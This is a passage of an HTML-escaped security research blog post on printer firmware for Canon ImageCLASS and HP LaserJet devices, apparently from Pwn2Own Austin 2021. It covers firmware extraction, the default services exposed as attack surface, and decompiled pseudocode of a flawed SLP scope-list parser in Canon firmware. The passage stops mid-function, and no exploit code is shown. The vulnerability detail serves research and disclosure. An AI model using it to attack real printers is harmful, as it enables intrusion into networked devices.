&lt;p&gt;How to solve this problem? We first found a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function with a known function name&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function name string&lt;/code&gt; belonging to it to make adjustments. After finding the offset, we adjusted the image base to the correct address. The final image base found is &lt;strong&gt;0x40affde0&lt;/strong&gt;. After adjustment, you can see that the original function name can be identified correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we can analyze the firmware typically. After preliminary analysis, we can find out the of Canon ImageCLASS MF644Cdw:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;HP’s firmware is relatively easy to obtain. We can use &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; to obtain the correct firmware. It took about 3-4 days. The other steps, such as finding the image base address, are just the same as Canon. After preliminary analysis, the architecture of HP Color LaserJet Pro MFP M283fdw is as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;Many services are enabled by default in most printers on the market today.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Usually, RUI (web interface) is opened for facilitate management. The 9100 Port is also commonly used by printers, mainly used to transmit printed data.&lt;/p&gt;

&lt;p&gt;Others vary between vendors, but the listed ones are usually present, and most are enabled by default. After evaluating the overall architecture, we focus on service discovery and the DNS series of services. Our long-term experience has often observed that such protocols implemented by manufacturers are often prone to vulnerabilities. The primary services we analyzed were &lt;strong&gt;SLP&lt;/strong&gt;, &lt;strong&gt;mDNS&lt;/strong&gt;, and &lt;strong&gt;LLMNR&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Next, we take Pwn2Own Austin 2021 as a case study to see what problems these protocols often have.&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP is a service discovery protocol that allows computers and other devices to find services in local area network. In the past, there were many &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;vulnerabilities&lt;/a&gt; in EXSI’s SLP. Canon implements the SLP service mainly by themselves. For details about SLP service, please refer to &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Before we look into the detail of SLP, we need to talk about the structure of SLP packets.&lt;/p&gt;

&lt;p&gt;SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we only need to pay attention to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;. This field determines the request type and the format of the payload part. Canon only implements Service Request and Attribute Request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Attribute Request (AttrRqst), the user can obtain the attribute list according to the service and scope. We can specify a scope to look for, such as Canon printers.&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Attribute Request structure is as follows
&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It mainly comprises length (Length) and value (Value). Parsing this kind of format should be careful because there are often bugs here. 
In fact, there is a vulnerability in Canon when paring this format.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
&lt;p&gt;When it parses the scope list, it converts escape characters to ASCII. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\41&lt;/code&gt; will be converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt;.  But what’s wrong with this simple transformation? Let’s take a look at the pseudocode.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_scope_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown in the above code, in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_scope_list&lt;/code&gt;, it passes a fixed size buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;destbuf&lt;/code&gt; and the maximum size 34 to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;. No vulnerability here.  Let’s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parse_escape_char&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_escape_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
